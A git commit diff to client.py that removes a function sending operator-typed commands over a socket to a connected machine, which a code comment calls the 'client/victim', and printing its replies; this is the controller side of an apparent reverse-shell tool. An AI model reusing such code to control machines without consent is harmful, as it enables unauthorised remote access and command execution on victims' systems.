1e99840616689be38da72866999eaacb7a3b3cd2
asjadbut <asjadb18@gmail.com>
2021-07-24 23:00:38 +0500

    Updated both files

--- client.py
+++ client.py
@@ -28,22 +28,6 @@ def accept_connection ():
     print("Accepting the connection!")
     connection,address  = s.accept()
     print("Connection established! IP: {} Port: {}".format(address[0],str(address[1])))
-    send_commands(connection)
-
-#send commands to a client/victim
-def send_commands(connection):
-    while True:
-        cmd = input("Enter command: ")
-        if cmd == "quit":
-            connection.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            print("Sending the data over the connection!")
-            connection.send(str.encode(cmd))
-            print("Data received from the client: " + "\n")
-            client_response  = str(connection.recvfrom(1024),"utf-8")
-            print(client_response, end="")
 
 def main():
     create_socket()
